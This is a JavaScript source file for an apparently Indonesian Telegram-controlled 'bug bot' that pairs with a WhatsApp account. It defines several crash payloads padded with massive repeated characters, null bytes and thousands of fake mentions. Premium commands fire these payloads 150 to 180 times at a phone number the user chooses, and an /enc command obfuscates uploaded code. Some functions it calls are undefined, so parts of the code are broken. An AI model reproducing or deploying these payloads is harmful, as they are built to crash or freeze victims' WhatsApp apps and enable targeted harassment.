const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
       const P = require('pino');
       const JsConfuser = require('js-confuser');
       const Qc = fs.readFileSync('./Qc.mp4')
       const chalk = require('chalk');
       const global = require('./AiXsetting.js');
       const Boom = require('@hapi/boom');
       const TelegramBot = require('node-telegram-bot-api');
       const bot = new TelegramBot(global.botToken, { polling: true });
       const owner = global.owner;
       const cooldowns = new Map();
       const crypto = require('crypto');
       const axios = require('axios');
       const BOT_TOKEN = global.botToken; 
       const startTime = new Date(); 


       function getOnlineDuration() {
            let onlineDuration = new Date() - startTime;   
            let seconds = Math.floor((onlineDuration / 1000) % 60);
            let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); 
            let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); 
            return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
       }

       function updateMenuBot() {
            const message = `${getOnlineDuration()}`;
            updateBotMenu(message);
       }
            function updateBotMenu(message) {
       }

       setInterval(() => {
            updateMenuBot();
       }, 1000);

       let Ai;
       //______>DATABASE<_______//
       let superVip = JSON.parse(fs.readFileSync('./AiXDB/AiVip.json'));
       let premiumUsers = JSON.parse(fs.readFileSync('./AiXDB/AiXprem.json'));
       let OwnerUsers = JSON.parse(fs.readFileSync('./AiXDB/AiOwn.json'));
       let adminUsers = JSON.parse(fs.readFileSync('./AiXDB/AiAdmin.json'));
       let bannedUser = JSON.parse(fs.readFileSync('./AiXDB/AiBanned.json'));
       let securityUser = JSON.parse(fs.readFileSync('./AiXDB/AiSecurity.json'));
        
       let whatsappStatus = false;
        
       async function startWhatsapp() {
             const {
                  state,
                  saveCreds
             } = await useMultiFileAuthState('AditFile');
             Ai = makeWASocket({
                   auth: state,
                   logger: P({
                      level: 'silent'
                   }),
                   printQRInTerminal: false,
             });
             Ai.ev.on('connection.update', async (update) => {
                   const {
                        connection,
                        lastDisconnect
                   } = update;
                   if (connection === 'close') {
                         const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
                         if (reason && reason >= 500 && reason < 600 && reason === 428 && reason === 408 && reason === 429) {
                         whatsappStatus = false;
                         await getSessions(bot, chatId, number);
                   } else {
                         whatsappStatus = false;
                   }
                   } else if (connection === 'open') {
                            whatsappStatus = true;
                   }
             })
       };

       async function getSessions(bot, chatId, number) {
            if (!bot || !chatId || !number) {
                console.error('Error: bot, chatId, atau number tidak terdefinisi!');
                return;
            }  
       const { state, saveCreds } = await useMultiFileAuthState('AditFile');
       Ai = makeWASocket({
            auth: state,
            logger: P({ level: 'silent' }),
            printQRInTerminal: false,
       });

       Ai.ev.on('connection.update', async (update) => {
       const { connection, lastDisconnect } = update;
        
       if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
           if (reason && reason >= 500 && reason < 600) {
                whatsappStatus = false;
                await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
                await getSessions(bot, chatId, number);
           } else {
               whatsappStatus = false;
               await bot.sendMessage(chatId, `Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
                if (fs.existsSync('./AditFile/creds.json')) {
                       fs.unlinkSync('./AditFile/creds.json');
                }
           }
       } else if (connection === 'open') {
           whatsappStatus = true;
           bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
       }

       if (connection === 'connecting') {
           await new Promise(resolve => setTimeout(resolve, 1000));
            try {
                 if (!fs.existsSync('./AditFile/creds.json')) {
                      const formattedNumber = number.replace(/\D/g, '');
                          const pairingCode = await Ai.requestPairingCode(formattedNumber);
                          const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                          bot.sendMessage(chatId, `\n╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│» Nᴜᴍʙᴇʀ : ${number}\n│» Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}\n╰───────────────────────╯`);
                      }
                 } catch (error) {
                     bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
                 }
            }
       });        
           Ai.ev.on('creds.update', saveCreds);
       }
        
       function savePremiumUsers() {
            fs.writeFileSync('./AiXDB/AiXprem.json', JSON.stringify(premiumUsers, null, 2));
       }
        
       function saveOwnerUsers() {
            fs.writeFileSync('./AiXDB/AiOwn.json', JSON.stringify(premiumUsers, null, 2));
       }
        
       function saveAdminUsers() {             
           fs.writeFileSync('./AiXDB/AiAdmin.json', JSON.stringify(adminUsers, null, 2));
       }
        
       function saveVip() {
          fs.writeFileSync('./AiXDB/AiVip.json', JSON.stringify(superVip, null, 2));
       }
       
       function saveBanned() {
          fs.writeFileSync('./AiXDB/AiBanned.json', JSON.stringify(bannedUser, null, 2));
       }
       
       function watchFile(filePath, updateCallback) {
           fs.watch(filePath, (eventType) => {
               if (eventType === 'change') {
                   try {
                      const updatedData = JSON.parse(fs.readFileSync(filePath));
                      updateCallback(updatedData);
                      console.log(`${filePath} SUCCESS UPDATE!!`);
                   } catch (error) {
                      console.error(`Error ${filePath}:`, error.message);
                   }
               }
           });
       }
       
        //______> DATABASE LU MEK <_______//
       watchFile('./AiXDB/AiXprem.json', (data) => (premiumUsers = data));
       watchFile('./AiXDB/AiAdmin.json', (data) => (adminUsers = data));
       watchFile('./AiXDB/AiBanned.json', (data) => (bannedUser = data));
       watchFile('./AiXDB/AiVip.json', (data) => (superVip = data));
       watchFile('./AiXDB/AiSecurity.json', (data) => (securityUser = data));
      
        //______> FUNCTION SLEEP BUG <_______//
       function sleep(ms) {
           return new Promise(resolve => setTimeout(resolve, ms));
       } // jangan di hapus y suki, penting buat jeda bug
       
       
       
               //______> FUNCTION BUG <_______//
  async function Newsletter(target) {
  try {
    let zxv = {
      viewOnceMessage: {
     message: {
    interactiveMessage: {
      contextInfo: {
       mentionedJid:  [" 0@s.whatsapp.net"], 
     isForwarded: true,
     forwardingScore: 999,
     forwardedNewsletterMessageInfo: {
       newsletterJid: "120363298524333143@newsletter",
       newsletterName: "@X",
           serverMessageId: 1
     }, 
      },
      header: {
     title: '@X',
     ...(await prepareWAMessageMedia({
       image: { url: "https://files.catbox.moe/jkhlwc.jpg" }, 
     }, {
            upload: Ai.waUploadToServer
     })),
     hasMediaAttachment: false
      },
      body: {
       text: "@X"
      },
      footer: {
        text: "@X"
      },
       nativeFlowMessage: {
           messageParamsJson: "{".repeat(100000), 
      }
    }
     }
   }                
    };
    
    await Ai.relayMessage(target, zxv, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

        //______> FUNCTION BUG <_______//
       async function TagSadboyCrash(target) {
  try {
    const mentionList = Array.from({ length: 20000 }, (_, i) => `${i}@s.whatsapp.net`);

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              mentionedJid: mentionList,
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363298524333143@newsletter",
                newsletterName: "🧨 S4DBOY",
                serverMessageId: 1
              },
            },
            header: {
              title: "💀 SADBOY FC 💀",
              ...(await prepareWAMessageMedia({
                image: { url: "https://telegra.ph/file/fdd9f45192bdf1f6e2a3e.jpg" }, // gambar palsu
              }, { upload: Ai.waUploadToServer })),
              hasMediaAttachment: false,
            },
            body: {
              text: "꧁𓆩☠️𓆪꧂ ".repeat(5000)
            },
            footer: {
              text: "JEBOLKAN 🔥 " + "🐍".repeat(2000)
            },
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify({
                screen_0_TextInput_0: "radio - buttons" + "ꦾ".repeat(150000),
                screen_0_Dropdown_2: "001-Grimgar",
                screen_1_TextInput_1: "SadboyFC",
                screen_2_OptIn_0: true,
                screen_2_OptIn_1: true,
                flow_token: "AQAAAAXxxxxxx_sadboy_extreme_token"
              }),
              version: 3
            }
          }
        }
      }
    };

    await Ai.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.error("💀 Gagal mengirim TagSadboyCrash:", err);
  }
}


        //______> FUNCTION BUG <_______//
async function nativeflow(sock, jid) {
  await Ai.relayMessage(jid, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          text: "Danger, you must die",
          contentText: "Danger, You must die" + "\u0000".repeat(70000),
          contextInfo: {
            forwardingScore: 6,
            isForwarded: true
          },
          headerType: 1,
          buttons: [
            {
              body: {
                text: "Danger, You must die"
              }
            }
          ],
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "JSON.stringify(listMessage)"
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "JSON.stringify(listMessage)"
              },
              {
                name: "mpm",
                buttonParamsJson: "JSON.stringify(listMessage)"
              }
            ]
          }
        }
      }
    }
  }, {});
}

       //______> FUNCTION BUG <_______//
async function DevilsProtocolV2(target, mention) {
  const sock = getActiveSock();
  if (!sock) {
    console.log("❌ Tidak ada koneksi WhatsApp aktif.");
    return; // Mencegah eksekusi lebih lanjut jika tidak ada koneksi aktif
  }

  console.log(chalk.white(`Succesfully Sending Devils Proto2 To ${target}`));

  const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "Devils Protocols" + "᭄".repeat(10000),
    title: "Version 2" + "᭄",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/UnDeath.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const devilsMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "999999999999",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: `🥶`,
        body: `${"\u0000".repeat(9117)}`,
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: null,
        sourceUrl: "https://t.me/FunctionLihX"
      },
      businessMessageForwardInfo: {
        businessOwnerJid: target
      },
      isSampled: true,
      mentionedJid: mentionjid
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363406229895095@newsletter",
      serverMessageId: 1,
      newsletterName: `${"ꦾ".repeat(100)}`
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: devilsMessage
      }
    }
  }, {});

  await Ai.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ai.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}

       //______> FUNCTION BUG <_______//
async function selios(target) {
Ai.relayMessage(
target,
{
  extendedTextMessage: {
    text: "𓆩".repeat(20000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: "5521992999999@s.whatsapp.net", 
      quotedMessage: {
        conversation: "Xarousel" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

        // bot.onText(/\/start, itu ibarat case mek dn dst

  //______>DISPLAY MENU<_______//
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`; 
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  
  let Start = `Hi ${senderName} Iam Valtorix bug bot, how to use?
Use the /menu command to bring up the menu.`;

  bot.sendMessage(chatId, Start, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Owner「👤」", url: "https://t.me/sixvty4nu" }, 
          { text: "Channel「💬」", url: "https://t.me/aboutme4zx" }
        ]
      ]
    }
  });
});
        
//______>DISPLAY MENU<_______//
  bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`; 
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  
  let Menu =` Halo 👋 User: ${senderName}, Im Valtorix Bot Im here to assist you
  
⨳ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁
 ▢ Creator : Copx
 ▢ Name : Valtorix
 ▢ Version : 2
 ▢ Type : Case 

⨳ 𝗢𝘄𝗻𝗲𝗿
 ▢ /addprem
 ▢ /addowner
 ▢ /delprem
 ▢ /delowner
 ▢ /pairing
 ▢ /enc

⨳ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
 ▢ /Qx
 ▢ /protox_delay
 ▢ /invisible_qx
 ▢ /bug_bulldozer
 ▢ /ios_crash
 
⨳ 𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼
 ▢ Adit
 ▢ Aphrodite
 ▢ Sanz 
 ▢ Tin
 ▢ Dragneel
 ▢ Aby
 ▢ Sako`;
  bot.sendAnimation(chatId, Qc, {
    caption: Menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Owner「👤」", url: "https://t.me/sixvty4nu" }, 
          { text: "Channel「💬」", url: "https://t.me/aboutme4zx" }
        ]
      ]
    }
  });
});
           //______>PAIRING CODE<_______//
      bot.onText(/\/pairing(?:\s(.+))?/, async (msg, match) => {
          const senderId = msg.from.id;
          const chatId = msg.chat.id;
          if (!owner.includes(senderId)) {
          return bot.sendMessage(chatId, "⚠️ Only Owner Bot!!")
      }

      if (!match[1]) {
           return bot.sendMessage(chatId, "Example : /pairing 62xxx ");
      }
      
      const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
      if (!/^\d+$/.test(numberTarget)) {
           return bot.sendMessage(chatId, "Example: /pairing 62xxx ");
      }
           await getSessions(bot, chatId, numberTarget)
      });
      
      //______>COOLDOWN BUG<_______//
      bot.onText(/\/cooldown(\d+)m/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
  
      if (!owner.includes(senderId)) {
          return bot.sendMessage(chatId, "⚠️You Not Access!! ");
      }

      if (!match || !match[1]) {
          return bot.sendMessage(chatId, "Example : /cooldown 10m ");
      }

      const newCooldown = parseInt(match[1], 10);
      if (isNaN(newCooldown) || newCooldown <= 0) {
           return bot.sendMessage(chatId, "Input  Duration ");
      }

      cooldownTime = newCooldown * 60; // Ubah ke detik
          return bot.sendMessage(chatId, `Cooldown Success Set To ${newCooldown} Minutes!! `);
      });
      
      //______>ENC JAVA SCRIPT<_______//         
      bot.onText(/\/enc/, async (msg) => {
           const chatId = msg.chat.id;
           const replyMessage = msg.reply_to_message;

           console.log(`Command /enc Sender: ${msg.from.username || msg.from.id}`);

           if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
           return bot.sendMessage(chatId, ' ⚠ Please reply with the JavaScript code.');
      }

      const fileId = replyMessage.document.file_id;
      const fileName = replyMessage.document.file_name;
      
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const codeBuffer = Buffer.from(response.data);

      const tempFilePath = `./@hardenc${fileName}`;
      fs.writeFileSync(tempFilePath, codeBuffer);
  
      bot.sendMessage(chatId, "Waitting For Procces.");
      const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
           target: "node",
           preset: "high",
           compact: true,
           minify: true,
           flatten: true,
           identifierGenerator: function () {
                const originalString = "肀xXxXx金" + "肀xXxXx金";
                function removeUnwantedChars(input) {
                   return input.replace(/[^a-zA-Z肀xXxXx金]/g, '');
                }
                function randomString(length) {
                    let result = '';
                    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                    for (let i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * characters.length));
                    }
                    return result;
                }
                return removeUnwantedChars(originalString) + randomString(2);
           }, 
           renameVariables: true,
           renameGlobals: true,
           stringEncoding: true,
           stringSplitting: 0.0,
           stringConcealing: true,
           stringCompression: true,
           duplicateLiteralsRemoval: 1.0,
           shuffle: { hash: 0.0, true: 0.0 },
           stack: true,
           controlFlowFlattening: 1.0,
           opaquePredicates: 0.9,
           deadCode: 0.0,
           dispatcher: true,
           rgf: false,
           calculator: true,
           hexadecimalNumbers: true,
           movedDeclarations: true,
           objectExtraction: true,
           globalConcealing: true
      });

    
      const encryptedFilePath = `./@hardenc${fileName}`;
      fs.writeFileSync(encryptedFilePath, obfuscatedCode);

  
      bot.sendDocument(chatId, encryptedFilePath, {
          caption: 
              `Successfuly Enc Hard`
          });
      });


      //______>ADD PREMIUM USERS<_______//
      bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
          return bot.sendMessage(chatId, "⚠️ Only Owner And Admin!! ");
      }

      if (!match[1]) {
           return bot.sendMessage(chatId, "Example : /addprem Id ");
      }

      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
           return bot.sendMessage(chatId, "Example : /addprem id");
      }

      if (!premiumUsers.includes(userId)) {
           premiumUsers.push(userId);
               savePremiumUsers();
               console.log(`${senderId} Added ${userId} To Premium`)
               bot.sendMessage(chatId, `✅ ${userId} Success Premium!! `);
           } else {
              bot.sendMessage(chatId, `${userId} Success Premium`);
           }
      });
     
      //______>DELETE PREMIUM USERS<_______//
      bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
           const chatId = msg.chat.id;
           const senderId = msg.from.id;
           if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
           return bot.sendMessage(chatId, "⚠️ Only Owner And Admin!!");
      }

      if (!match[1]) {
           return bot.sendMessage(chatId, "Example: /delprem Id");
      }

      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (premiumUsers.includes(userId)) {
           premiumUsers = premiumUsers.filter(id => id !== userId);
                savePremiumUsers();
                console.log(`${senderId} Dihapus ${userId} Dari Premium`)
                bot.sendMessage(chatId, `✅ ${userId} Succes Delete Premium!! `);
           } else { 
               bot.sendMessage(chatId, `${userId} Succes Delete Premium`);
           }
      });

      //______>ADD OWNER<_______//
      bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
           const chatId = msg.chat.id;
           const senderId = msg.from.id;
           if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
           return bot.sendMessage(chatId, "⚠️ Only Owner And Admin!!");
      }

      if (!match[1]) {
           return bot.sendMessage(chatId, "Example : /addowner Id ");
      }

      const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
      if (isNaN(userId)) {
          return bot.sendMessage(chatId,  "Example : /addowner Id ");
      }

      if (!OwnerUsers.includes(userId)) {
           OwnerUsers.push(userId);
                saveOwnerUsers(); 
                console.log(`${senderId} Added ${userId} To Owner`);
                bot.sendMessage(chatId, `✅ ${userId} Succes Owner!!`);
           } else {
                bot.sendMessage(chatId, `${userId} Succes Owner`);
           }
      });
      
      //______>DELETE OWNER<_______//
      bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
           const chatId = msg.chat.id;
           const senderId = msg.from.id; 
           if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
           return bot.sendMessage(chatId, "⚠️ Only Owner And Admin!!"); 
      }

      if (!match[1]) {
           return bot.sendMessage(chatId, "Example : /delowner Id");
           
      }
 
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
      if (isNaN(userId)) {
            return bot.sendMessage(chatId, "Input Id Valid");
      }
  
      if (OwnerUsers.includes(userId)) {   
           OwnerUsers = superVip.filter(id => id !== userId);
               saveOwnerUsers(); 
               console.log(`${senderId} Delete ${userId} From Owner!`);
               bot.sendMessage(chatId, `✅ ${userId} Success Delete Owner!!`);
           } else {
               bot.sendMessage(chatId, `${userId} Success Delete Owner`);
           }
      });  
   
     
        //______>CASE BUG<_______//
    bot.onText(/\/tagextreme (\d+)/, async (msg, match) => {
  const number = match[1];
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!whatsappStatus) return bot.sendMessage(chatId, "❌ WA belum konek.");
  if (!premiumUsers.includes(senderId)) return bot.sendMessage(chatId, "❌ Premium Only.");

  const target = number + "@s.whatsapp.net";
  await bot.sendMessage(chatId, `💀 Sending EXTREME FC to ${number}...`);

  try {
    await TagSadboyCrash(target);
    await bot.sendMessage(chatId, "✅ Sent! Tunggu efeknya...");
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "❌ Gagal kirim EXTREME payload.");
  }
});



        //______>CASE BUG<_______//
    bot.onText(/\/protox_delay(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Not Connect To Whatsapp");
    }

    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚠️ Only Premium Users");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "Example: /protox_delay 62xxx");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "Pake Nomer Bukan Huruf!!");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim status awal
    await bot.sendMessage(chatId, `𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
Number : ${numberTarget} 
Commands : /protox_delay
Note : Let The bot take a short pause to manage the next data`);

    // Kirim bug/message sebanyak 100x
    for (let i = 0; i < 150; i++) {
        try {
            await nativeflow(formatedNumber);
            await sleep(1000);
        } catch (err) {
            console.error(`Error sending bug to ${numberTarget}`, err);
        }
    }
});


        //______>CASE BUG<_______//
    bot.onText(/\/ios_crash(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Not Connect To Whatsapp");
    }

    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚠️ Only Premium Users");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "Example: /ios_crash 62xxx");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "Pake Nomer Bukan Huruf!!");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim status awal
    await bot.sendMessage(chatId, `𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
Number : ${numberTarget} 
Commands : /protox_delay
Note : Let The bot take a short pause to manage the next data`);

    // Kirim bug/message sebanyak 100x
    for (let i = 0; i < 180; i++) {
        try {
            await selios(formatedNumber);
            await sleep(1000);
        } catch (err) {
            console.error(`Error sending bug to ${numberTarget}`, err);
        }
    }
});

//______>CASE BUG<_______//
    bot.onText(/\/bug_bulldozer(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Not Connect To Whatsapp");
    }

    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚠️ Only Premium Users");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "Example: /bug_bulldozer 62xxx");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "Pake Nomer Bukan Huruf!!");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim status awal
    await bot.sendMessage(chatId, `𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
Number : ${numberTarget} 
Commands : /bug_bulldozer
Note : Let The bot take a short pause to manage the next data`);

    // Kirim bug/message sebanyak 100x
    for (let i = 0; i < 180; i++) {
        try {
            await bulldozer(formatedNumber);
            await sleep(1000);
        } catch (err) {
            console.error(`Error sending bug to ${numberTarget}`, err);
        }
    }
});

//______>CASE BUG<_______//
    bot.onText(/\/invisible_qx(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Not Connect To Whatsapp");
    }

    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚠️ Only Premium Users");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "Example: /invisible_qx 62xxx");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "Pake Nomer Bukan Huruf!!");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim status awal
    await bot.sendMessage(chatId, `𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
Number : ${numberTarget} 
Commands :  /invisible_qx
Note : Let The bot take a short pause to manage the next data`);

    // Kirim bug/message sebanyak 100x
    for (let i = 0; i < 175; i++) {
        try {
            await DevilsProtocolV2(formatedNumber);
            await sleep(1000);
        } catch (err) {
            console.error(`Error sending bug to ${numberTarget}`, err);
        }
    }
});